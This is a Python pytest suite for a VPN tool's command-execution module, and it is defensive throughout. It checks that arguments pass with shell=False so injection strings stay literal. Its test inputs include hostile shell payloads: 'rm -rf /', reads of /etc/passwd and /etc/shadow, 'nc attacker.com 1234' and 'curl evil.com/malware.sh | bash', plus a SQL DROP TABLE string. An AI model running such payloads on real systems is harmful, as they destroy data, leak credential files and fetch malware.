"""Comprehensive tests for command execution security.

This test suite ensures that the command execution module properly prevents
command injection attacks by using array-based commands with shell=False.
"""

import pytest
import subprocess
from pathlib import Path
from vpnhd.system.commands import (
    CommandResult,
    execute_command,
    execute_commands,
    check_command_exists,
    run_command_with_input,
    get_command_output,
    command_exists_any,
    get_command_version,
)


class TestCommandResult:
    """Test CommandResult dataclass."""

    def test_command_result_creation(self):
        """Test creating a CommandResult."""
        result = CommandResult(
            exit_code=0, stdout="output", stderr="", success=True, command="echo test"
        )

        assert result.exit_code == 0
        assert result.stdout == "output"
        assert result.stderr == ""
        assert result.success is True
        assert result.command == "echo test"

    def test_command_result_boolean_evaluation_success(self):
        """Test CommandResult boolean evaluation for success."""
        result = CommandResult(exit_code=0, stdout="", stderr="", success=True, command="test")

        assert bool(result) is True
        assert result  # Truthy evaluation

    def test_command_result_boolean_evaluation_failure(self):
        """Test CommandResult boolean evaluation for failure."""
        result = CommandResult(
            exit_code=1, stdout="", stderr="error", success=False, command="test"
        )

        assert bool(result) is False
        assert not result  # Falsy evaluation


class TestExecuteCommand:
    """Test execute_command function (CRITICAL for security)."""

    def test_execute_array_command_success(self, mocker):
        """Test executing command as array (secure format)."""
        # Mock subprocess.run
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="output",
            stderr="",
        )

        result = execute_command(["echo", "test"])

        assert result.success is True
        assert result.exit_code == 0
        assert result.stdout == "output"

        # Verify subprocess.run was called with shell=False
        mock_run.assert_called_once()
        call_args = mock_run.call_args
        assert call_args.kwargs["shell"] is False
        assert call_args.args[0] == ["echo", "test"]

    def test_execute_string_command_with_shlex(self, mocker):
        """Test executing command as string (parsed with shlex)."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="output",
            stderr="",
        )

        result = execute_command("echo test argument")

        assert result.success is True

        # Verify shlex.split was used correctly
        call_args = mock_run.call_args
        assert call_args.kwargs["shell"] is False
        assert call_args.args[0] == ["echo", "test", "argument"]

    def test_malicious_input_as_literal_argument(self, mocker):
        """Test that malicious input is treated as literal argument."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        # This would be dangerous with shell=True, safe with shell=False
        malicious = "test; rm -rf /"
        result = execute_command(["echo", malicious])

        # Verify malicious string is passed as literal argument
        call_args = mock_run.call_args
        assert call_args.kwargs["shell"] is False
        assert call_args.args[0] == ["echo", "test; rm -rf /"]
        # The semicolon and command are treated as a single literal string

    def test_sudo_prepending(self, mocker):
        """Test that sudo is correctly prepended when requested."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        result = execute_command(["ip", "link"], sudo=True)

        # Verify sudo was prepended
        call_args = mock_run.call_args
        assert call_args.args[0] == ["sudo", "ip", "link"]
        assert call_args.kwargs["shell"] is False

    def test_command_timeout_handling(self, mocker):
        """Test timeout handling."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="sleep 10", timeout=1)

        result = execute_command(["sleep", "10"], timeout=1)

        assert result.success is False
        assert result.exit_code == -1
        assert "timed out" in result.stderr.lower()

    def test_command_failure_handling(self, mocker):
        """Test handling of failed commands."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=1,
            stdout="",
            stderr="error occurred",
        )

        result = execute_command(["false"], check=False)

        assert result.success is False
        assert result.exit_code == 1
        assert result.stderr == "error occurred"

    def test_command_failure_with_check_raises(self, mocker):
        """Test that check=True raises exception on failure."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=1,
            stdout="",
            stderr="error",
        )

        with pytest.raises(subprocess.CalledProcessError):
            execute_command(["false"], check=True)

    def test_capture_output_disabled(self, mocker):
        """Test that capture_output can be disabled."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout=None,
            stderr=None,
        )

        result = execute_command(["echo", "test"], capture_output=False)

        call_args = mock_run.call_args
        assert call_args.kwargs["capture_output"] is False
        assert result.stdout == ""
        assert result.stderr == ""

    def test_working_directory_parameter(self, mocker):
        """Test that cwd parameter is passed correctly."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        cwd = Path("/tmp")
        result = execute_command(["ls"], cwd=cwd)

        call_args = mock_run.call_args
        assert call_args.kwargs["cwd"] == cwd

    def test_environment_variables_parameter(self, mocker):
        """Test that env parameter is passed correctly."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        env = {"PATH": "/usr/bin"}
        result = execute_command(["ls"], env=env)

        call_args = mock_run.call_args
        assert call_args.kwargs["env"] == env

    def test_exception_handling(self, mocker):
        """Test handling of unexpected exceptions."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.side_effect = Exception("Unexpected error")

        result = execute_command(["test"])

        assert result.success is False
        assert result.exit_code == -1
        assert "Unexpected error" in result.stderr


class TestExecuteCommands:
    """Test execute_commands function (batch execution)."""

    def test_execute_multiple_commands_success(self, mocker):
        """Test executing multiple commands successfully."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="output",
            stderr="",
        )

        commands = ["echo test1", "echo test2", "echo test3"]
        results = execute_commands(commands)

        assert len(results) == 3
        assert all(r.success for r in results)
        assert mock_run.call_count == 3

    def test_stop_on_error_true(self, mocker):
        """Test that stop_on_error=True stops on first failure."""
        mock_run = mocker.patch("subprocess.run")
        # First command succeeds, second fails
        mock_run.side_effect = [
            mocker.Mock(returncode=0, stdout="", stderr=""),
            mocker.Mock(returncode=1, stdout="", stderr="error"),
        ]

        commands = ["echo test1", "false", "echo test3"]
        results = execute_commands(commands, stop_on_error=True)

        # Should only execute 2 commands
        assert len(results) == 2
        assert results[0].success is True
        assert results[1].success is False
        assert mock_run.call_count == 2

    def test_stop_on_error_false(self, mocker):
        """Test that stop_on_error=False continues after failures."""
        mock_run = mocker.patch("subprocess.run")
        # Second command fails, others succeed
        mock_run.side_effect = [
            mocker.Mock(returncode=0, stdout="", stderr=""),
            mocker.Mock(returncode=1, stdout="", stderr="error"),
            mocker.Mock(returncode=0, stdout="", stderr=""),
        ]

        commands = ["echo test1", "false", "echo test3"]
        results = execute_commands(commands, stop_on_error=False)

        # Should execute all 3 commands
        assert len(results) == 3
        assert results[0].success is True
        assert results[1].success is False
        assert results[2].success is True
        assert mock_run.call_count == 3


class TestCheckCommandExists:
    """Test check_command_exists function."""

    def test_command_exists(self, mocker):
        """Test checking for existing command."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="/usr/bin/ls",
            stderr="",
        )

        result = check_command_exists("ls")

        assert result is True
        # Verify it uses shlex.quote for safety
        call_args = mock_run.call_args
        assert call_args.kwargs["shell"] is False

    def test_command_does_not_exist(self, mocker):
        """Test checking for non-existent command."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=1,
            stdout="",
            stderr="not found",
        )

        result = check_command_exists("nonexistent_command")

        assert result is False

    def test_malicious_command_name_is_quoted(self, mocker):
        """Test that malicious command names are safely quoted."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=1,
            stdout="",
            stderr="",
        )

        # Malicious command name with injection attempt
        malicious = "ls; rm -rf /"
        result = check_command_exists(malicious)

        # Verify shlex.quote was used (command should be quoted)
        # The implementation uses shlex.quote, so the malicious
        # string will be treated as a single argument


class TestRunCommandWithInput:
    """Test run_command_with_input function."""

    def test_command_with_stdin_input(self, mocker):
        """Test executing command with stdin input."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="processed",
            stderr="",
        )

        result = run_command_with_input(["grep", "test"], input_data="test data\nmore data")

        assert result.success is True
        call_args = mock_run.call_args
        assert call_args.kwargs["shell"] is False
        assert call_args.kwargs["input"] == "test data\nmore data"
        assert call_args.args[0] == ["grep", "test"]

    def test_command_with_input_and_sudo(self, mocker):
        """Test command with input and sudo."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        result = run_command_with_input(["tee", "/etc/config"], input_data="config data", sudo=True)

        call_args = mock_run.call_args
        assert call_args.args[0] == ["sudo", "tee", "/etc/config"]
        assert call_args.kwargs["shell"] is False

    def test_command_with_input_timeout(self, mocker):
        """Test timeout handling with input."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.side_effect = subprocess.TimeoutExpired(cmd="cat", timeout=1)

        result = run_command_with_input(["cat"], input_data="data", timeout=1)

        assert result.success is False
        assert "timed out" in result.stderr.lower()

    def test_malicious_stdin_data_is_safe(self, mocker):
        """Test that malicious stdin data is safely passed."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        # Malicious stdin data
        malicious_input = "; rm -rf /\n$(whoami)\n`id`"

        result = run_command_with_input(["cat"], input_data=malicious_input)

        # Verify the malicious data is passed as literal input
        call_args = mock_run.call_args
        assert call_args.kwargs["shell"] is False
        assert call_args.kwargs["input"] == malicious_input


class TestGetCommandOutput:
    """Test get_command_output function."""

    def test_get_output_success(self, mocker):
        """Test getting command output successfully."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="  output with whitespace  \n",
            stderr="",
        )

        output = get_command_output("echo test")

        assert output == "output with whitespace"  # Stripped

    def test_get_output_failure_returns_none(self, mocker):
        """Test that failed command returns None."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=1,
            stdout="",
            stderr="error",
        )

        output = get_command_output("false")

        assert output is None

    def test_get_output_with_sudo(self, mocker):
        """Test get_command_output with sudo."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="output",
            stderr="",
        )

        output = get_command_output("cat /etc/shadow", sudo=True)

        call_args = mock_run.call_args
        assert call_args.args[0][0] == "sudo"


class TestCommandExistsAny:
    """Test command_exists_any function."""

    def test_at_least_one_exists(self, mocker):
        """Test when at least one command exists."""
        mock_run = mocker.patch("subprocess.run")
        # First command fails, second succeeds
        mock_run.side_effect = [
            mocker.Mock(returncode=1, stdout="", stderr=""),
            mocker.Mock(returncode=0, stdout="/usr/bin/apt", stderr=""),
        ]

        result = command_exists_any(["apt-get", "apt"])

        assert result is True

    def test_none_exist(self, mocker):
        """Test when no commands exist."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=1,
            stdout="",
            stderr="",
        )

        result = command_exists_any(["nonexistent1", "nonexistent2"])

        assert result is False

    def test_empty_list(self):
        """Test with empty command list."""
        result = command_exists_any([])

        assert result is False


class TestGetCommandVersion:
    """Test get_command_version function."""

    def test_get_version_success(self, mocker):
        """Test getting command version successfully."""
        mock_run = mocker.patch("subprocess.run")
        # First call checks if command exists, second gets version
        mock_run.side_effect = [
            mocker.Mock(returncode=0, stdout="/usr/bin/python3", stderr=""),
            mocker.Mock(returncode=0, stdout="Python 3.11.2\nmore info", stderr=""),
        ]

        version = get_command_version("python3")

        assert version == "Python 3.11.2"  # Only first line

    def test_get_version_custom_flag(self, mocker):
        """Test using custom version flag."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.side_effect = [
            mocker.Mock(returncode=0, stdout="/usr/bin/gcc", stderr=""),
            mocker.Mock(returncode=0, stdout="gcc version 11.3.0", stderr=""),
        ]

        version = get_command_version("gcc", version_flag="-v")

        # Verify custom flag was used
        call_args = mock_run.call_args_list[1]
        assert call_args.args[0] == ["gcc", "-v"]

    def test_get_version_command_not_found(self, mocker):
        """Test when command doesn't exist."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=1,
            stdout="",
            stderr="not found",
        )

        version = get_command_version("nonexistent")

        assert version is None

    def test_get_version_fails(self, mocker):
        """Test when version command fails."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.side_effect = [
            mocker.Mock(returncode=0, stdout="/usr/bin/cmd", stderr=""),
            mocker.Mock(returncode=1, stdout="", stderr="error"),
        ]

        version = get_command_version("cmd")

        assert version is None


class TestCommandInjectionPrevention:
    """Comprehensive command injection prevention tests."""

    @pytest.mark.parametrize(
        "malicious_input",
        [
            "; rm -rf /",
            "&& cat /etc/passwd",
            "| nc attacker.com 1234",
            "`whoami`",
            "$(id)",
            "../../../etc/shadow",
            "'; DROP TABLE users; --",
            "test\n/bin/bash",
            "test && curl evil.com/malware.sh | bash",
        ],
    )
    def test_malicious_arguments_treated_as_literals(self, mocker, malicious_input):
        """Test that all malicious inputs are treated as literal arguments."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        # Execute command with malicious input as argument
        result = execute_command(["echo", malicious_input])

        # Verify shell=False prevents injection
        call_args = mock_run.call_args
        assert call_args.kwargs["shell"] is False

        # Malicious string is passed as literal argument
        assert call_args.args[0] == ["echo", malicious_input]

        assert result.success is True

    def test_no_shell_true_ever(self, mocker):
        """Test that shell=True is NEVER used."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        # Try various command formats
        execute_command(["ls"])
        execute_command("ls -la")
        execute_command(["echo", "test"], sudo=True)
        run_command_with_input(["cat"], "data")

        # Verify shell=False in ALL calls
        for call in mock_run.call_args_list:
            assert call.kwargs["shell"] is False

    def test_pipe_operators_as_literals(self, mocker):
        """Test that pipe operators are treated as literal strings."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        # Command with pipe (dangerous with shell=True)
        result = execute_command(["echo", "test | cat"])

        call_args = mock_run.call_args
        assert call_args.kwargs["shell"] is False
        # The pipe is part of the literal string, not a shell operator
        assert call_args.args[0] == ["echo", "test | cat"]

    def test_semicolon_operators_as_literals(self, mocker):
        """Test that semicolon operators are treated as literal strings."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        # Command with semicolon (dangerous with shell=True)
        result = execute_command(["echo", "test; rm -rf /"])

        call_args = mock_run.call_args
        assert call_args.kwargs["shell"] is False
        # The semicolon and following command are literal
        assert call_args.args[0] == ["echo", "test; rm -rf /"]

    def test_command_substitution_as_literals(self, mocker):
        """Test that command substitution syntax is treated as literal."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        # Command substitution (dangerous with shell=True)
        malicious = "$(whoami)"
        result = execute_command(["echo", malicious])

        call_args = mock_run.call_args
        assert call_args.kwargs["shell"] is False
        # $() is treated as literal string, not executed
        assert call_args.args[0] == ["echo", "$(whoami)"]


class TestEdgeCases:
    """Test edge cases and boundary conditions."""

    def test_empty_command_list(self, mocker):
        """Test handling of empty command list."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.side_effect = Exception("Empty command")

        result = execute_command([])

        # Should handle gracefully
        assert result.success is False

    def test_whitespace_in_arguments(self, mocker):
        """Test arguments with whitespace."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        result = execute_command(["echo", "test   with   spaces"])

        call_args = mock_run.call_args
        # Whitespace preserved in argument
        assert call_args.args[0] == ["echo", "test   with   spaces"]

    def test_unicode_in_arguments(self, mocker):
        """Test unicode characters in arguments."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        result = execute_command(["echo", "test 🔥 unicode"])

        call_args = mock_run.call_args
        assert call_args.args[0] == ["echo", "test 🔥 unicode"]

    def test_very_long_command(self, mocker):
        """Test handling of very long commands."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        long_arg = "a" * 10000
        result = execute_command(["echo", long_arg])

        assert result.success is True

    def test_none_timeout_uses_default(self, mocker):
        """Test that None timeout uses default value."""
        mock_run = mocker.patch("subprocess.run")
        mock_run.return_value = mocker.Mock(
            returncode=0,
            stdout="",
            stderr="",
        )

        result = execute_command(["echo", "test"], timeout=None)

        call_args = mock_run.call_args
        # Should use COMMAND_TIMEOUT_DEFAULT, not None
        assert call_args.kwargs["timeout"] is not None
